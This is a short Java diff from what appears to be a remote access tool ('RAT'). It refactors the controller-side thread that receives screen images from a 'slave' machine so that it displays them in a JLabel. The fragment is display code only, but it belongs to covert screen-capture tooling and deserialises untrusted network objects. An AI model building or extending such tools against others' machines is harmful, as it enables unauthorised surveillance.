@@ -5,12 +5,14 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.Socket;
 import javax.swing.ImageIcon;
+import javax.swing.JLabel;
+
 import netPack.EventRAT;
 import netPack.PictureEventRAT;
 
 public class ImageThread extends Thread{
 	
-	private ImageIcon ii;
+	private JLabel jl;
 	private Socket s;
 	private boolean run;
 	private ObjectInputStream oin;
@@ -20,9 +22,9 @@ public class ImageThread extends Thread{
 	 * Will keep receiving images from the slave threw a socket connection
 	 * and set the image to the ImageIcon that comes from the GUIMASTER class
 	 */
-	public ImageThread(Socket s,ImageIcon ii){
+	public ImageThread(Socket s,JLabel jl){
 		this.s = s;
-		this.ii = ii;
+		this.jl = jl;
 		
 		//Try setting up the streams
 		try {
@@ -41,9 +43,7 @@ public class ImageThread extends Thread{
 		try {
 			while (run && ((inputPic = (PictureEventRAT)oin.readObject()) != null)){
 				//Grab the picture and set it into the ImageIcon
-				System.out.println("[INFO] - Getting image");
-				ii = inputPic.getIi();
-				System.out.println("[INFO] - Got the image");
+				jl.setIcon(inputPic.getIi());
 			}
 		} catch (IOException e) {
 			System.err.println("[ERROR] - IOException in reciveving the picture");
